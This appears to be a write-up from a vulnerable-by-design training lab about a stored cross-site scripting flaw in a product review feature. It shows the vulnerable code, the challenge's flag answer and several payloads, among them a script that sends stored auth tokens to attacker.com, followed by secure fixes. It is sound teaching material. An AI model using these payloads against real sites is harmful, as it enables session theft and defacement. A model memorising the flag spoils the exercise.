# Cross-Site Scripting (XSS) - Stored

## Overview

This vulnerability demonstrates a critical security flaw where the application stores user-supplied content without proper sanitization and renders it directly in the browser. This allows attackers to inject malicious JavaScript code that executes in the context of other users' browsers when they view the affected content.

## Why This Is Dangerous

### Stored XSS Attack Vector

When an application stores user input and displays it without proper encoding or sanitization, it creates a persistent attack vector:

1. **Persistent attack** - The malicious script is stored in the database and executed every time the content is viewed
2. **Session hijacking** - Attackers can steal authentication tokens and session cookies
3. **Phishing attacks** - Malicious scripts can modify page content to trick users
4. **Data exfiltration** - Scripts can send sensitive user data to attacker-controlled servers
5. **Privilege escalation** - Scripts can perform actions on behalf of authenticated users

## The Vulnerability

In this application, the product review system is vulnerable to stored XSS attacks. The vulnerability exists in two places:

1. **API endpoint** (`/api/products/[id]/reviews`) - Accepts review content without sanitization
2. **Frontend component** (`ProductDetailClient`) - Renders review content without any encoding

### Vulnerable Code

**API Endpoint (No Sanitization):**

```typescript
const review = await prisma.review.create({
  data: {
    productId: id,
    content: content.trim(), // ❌ No sanitization
    author,
  },
});
```

**Frontend Rendering (Unsafe HTML Injection):**

```typescript
<div
  ref={(el) => {
    reviewRefs.current[review.id] = el;  // ❌ Direct HTML injection
  }}
  className="text-slate-700 dark:text-slate-300"
/>
```

## Exploitation

### How to Retrieve the Flag

To retrieve the flag `OSS{cr0ss_s1t3_scr1pt1ng_xss}`, you need to exploit the stored XSS vulnerability:

**Exploitation Steps:**

1. Navigate to any product page (e.g., `/products/[id]`)
2. Scroll down to the "Reviews" section
3. In the review form, enter a malicious JavaScript payload:

```html
<script>
  fetch("/api/flags/cross-site-scripting-xss")
    .then((r) => r.json())
    .then((data) => {
      if (data.flag) {
        alert("Flag: " + data.flag);
      }
    });
</script>
```

4. Submit the review
5. The malicious script will be stored in the database
6. When any user (including yourself) views the product page, the script will execute

**Alternative Payload (Stealing Authentication Tokens):**

```html
<script>
  const token = localStorage.getItem("authToken");
  const user = localStorage.getItem("user");
  fetch(
    "https://attacker.com/steal?token=" +
      encodeURIComponent(token) +
      "&user=" +
      encodeURIComponent(user)
  );
</script>
```

**Alternative Payload (Defacing the Page):**

```html
<script>
  document.body.innerHTML = "<h1>Hacked by XSS!</h1>";
</script>
```

### Secure Implementation

```typescript
// ✅ SECURE - Sanitize on server
import DOMPurify from "isomorphic-dompurify";

const review = await prisma.review.create({
  data: {
    productId: id,
    content: DOMPurify.sanitize(content.trim()), // Sanitize before storing
    author,
  },
});
```

```typescript
// ✅ SECURE - Use React's built-in escaping
<div className="text-slate-700 dark:text-slate-300">
  {review.content} {/* React automatically escapes HTML */}
</div>
```

```typescript
// ✅ SECURE - If HTML is needed, sanitize before rendering
import DOMPurify from 'isomorphic-dompurify';

<div
  className="text-slate-700 dark:text-slate-300"
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(review.content)
  }}
/>
```

## References

- [OWASP Top 10 - Cross-Site Scripting (XSS)](<https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)>)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [React Security - dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
